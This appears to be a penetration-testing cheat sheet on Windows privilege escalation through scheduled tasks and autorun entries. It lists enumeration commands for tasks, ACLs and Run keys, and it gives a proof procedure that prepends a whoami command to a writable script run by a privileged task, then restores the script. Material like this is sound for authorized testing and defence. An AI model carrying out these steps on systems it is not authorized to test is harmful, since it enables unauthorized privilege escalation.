# Scheduled tasks and autoruns

Needs: a more-privileged consumer + control over something it executes or reads + a trigger.

## Task, principal, action
```powershell
Get-ScheduledTask | Select-Object TaskPath,TaskName,State

$TaskPath = '\<FOLDER>\'
$TaskName = '<TASK>'
$FullTaskName = $TaskPath + $TaskName
$Task = Get-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName
$Task.Principal | Format-List UserId,GroupId,RunLevel,LogonType
$Task.Actions | Format-List Execute,Arguments,WorkingDirectory
$Task.Triggers | Format-List *
$Task.Settings | Format-List *
$Task | Get-ScheduledTaskInfo | Format-List LastRunTime,LastTaskResult,NextRunTime
Export-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName
```
No ScheduledTasks module:
```cmd
schtasks.exe /query /fo LIST /v
schtasks.exe /query /tn "\<FOLDER>\<TASK>" /fo LIST /v
schtasks.exe /query /tn "\<FOLDER>\<TASK>" /xml
```
- Access denied ≠ task absent: query the known task directly. `/xml` needs the full task path.
- `TaskPath` has leading + trailing backslashes.

| Field | Check |
| --- | --- |
| Principal / run level | Real account/SID. `HighestAvailable` does not make an ordinary user admin |
| Logon type | `InteractiveToken` needs a live session; `S4U` has no network access |
| Actions | Exact exe, arguments, scripts it reads. `cmd.exe`/`powershell.exe` ≠ the script in its arguments |
| Working directory | Relative files resolve here, not in your shell's directory |
| Triggers / settings | Schedule, enabled, demand-start, overlapping-instance policy |

## Writable file vs registered task
```powershell
icacls 'C:\Path\To\script.cmd'
icacls 'C:\Path\To'
Get-Acl -LiteralPath 'C:\Path\To\script.cmd' | Format-List Owner,AccessToString
```
Task security descriptor:
```powershell
$Scheduler = New-Object -ComObject 'Schedule.Service'
$Scheduler.Connect()
$RegisteredTask = $Scheduler.GetFolder($TaskPath).GetTask($TaskName)
$RegisteredTask.GetSecurityDescriptor(7)
```
- Write on an existing file ≠ create/replace a file in its directory.
- Edit tasks through Task Scheduler (API/cmdlets), not `C:\Windows\System32\Tasks`. Export XML + SDDL before a definition change.

| Control | Gives you | Still needed |
| --- | --- | --- |
| Write action script | Changed bytes on next run | Privileged consumer + trigger |
| Control parent directory | Create missing dependency / replace child | Lookup behavior + trigger |
| Modify task definition | Change action | Task rights + trigger |
| Execute right | Run now (`schtasks /run`) | Something controlled to run |

## Proof: writable `.cmd` script run by a privileged task
Prepend identity output; keep the original bytes after it (task must be Ready, no overlapping run).

```powershell
$ScriptPath = 'C:\Path\To\script.cmd'
$ProofPath = 'C:\Path\To\task-proof.txt'
$OriginalBytes = [IO.File]::ReadAllBytes($ScriptPath)
$Prefix = '@"%SystemRoot%\System32\whoami.exe" /all > "' + $ProofPath + '" 2>&1' + "`r`n"
[IO.File]::WriteAllBytes($ScriptPath, [byte[]]([Text.Encoding]::ASCII.GetBytes($Prefix) + $OriginalBytes))
schtasks.exe /run /tn $FullTaskName
Get-Content -LiteralPath $ProofPath
```
Restore:
```powershell
[IO.File]::WriteAllBytes($ScriptPath, $OriginalBytes)
Remove-Item -LiteralPath $ProofPath
```
- Needs an ASCII script without BOM and paths without `%` or `!`.
- `schtasks /run` acknowledgement ≠ completed run. Task has no demand-start / no execute right → wait for its real trigger.
- Output as an ordinary user = that user, not SYSTEM.

## Task results
```powershell
'0x{0:X8}' -f ([int64]$RegisteredTask.LastTaskResult -band 4294967295L)
```
| Observation | Check |
| --- | --- |
| No new last-run time | Trigger, enabled, demand-start permission, conditions, overlap policy |
| `0x00041301` | Still running |
| `0x00041303` | Not yet run |
| `0x80070002` / `0x80070003` | Exe/dependency path, arguments, working directory, account access |
| `0x80070005` | Access denied: query/run/start/files |
| Fresh run, no proof | Wrong file consumed, encoding/quoting, output-dir ACL, action ended early |

```cmd
wevtutil.exe qe Microsoft-Windows-TaskScheduler/Operational /c:20 /rd:true /f:text
```
- Log disabled = no visibility, not "did not run".

## Autoruns
```cmd
reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg.exe query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /reg:64
reg.exe query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /reg:64
reg.exe query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /reg:32
reg.exe query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /reg:32
```
```powershell
Get-Acl 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List Owner,AccessToString
Get-Acl 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List Owner,AccessToString
$UserStartup = [Environment]::GetFolderPath('Startup')
$CommonStartup = [Environment]::GetFolderPath('CommonStartup')
Get-ChildItem -LiteralPath $UserStartup,$CommonStartup -Force
icacls $UserStartup
icacls $CommonStartup
```
```powershell
.\autorunsc.exe -accepteula -a lt -c
```
- 32-bit OS: one view. HKCU only shows your own hive.
- Startup defaults: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`.
- Check a shortcut's target, arguments and working directory too.
- `autorunsc -a '*' -c` for the full inventory. Signature filtering can hide a signed launcher that runs a writable script.

| Entry | Check |
| --- | --- |
| Current-user Run/Startup | Runs as that user at logon: no escalation unless a stronger consumer exists |
| Machine Run / Common Startup | Needs a logon; runs as the logging-in user, not SYSTEM |
| Another user's writable script/shortcut | Their logon + privileges |
| HKLM RunOnce | Admin logon after reboot; value is removed before it runs |
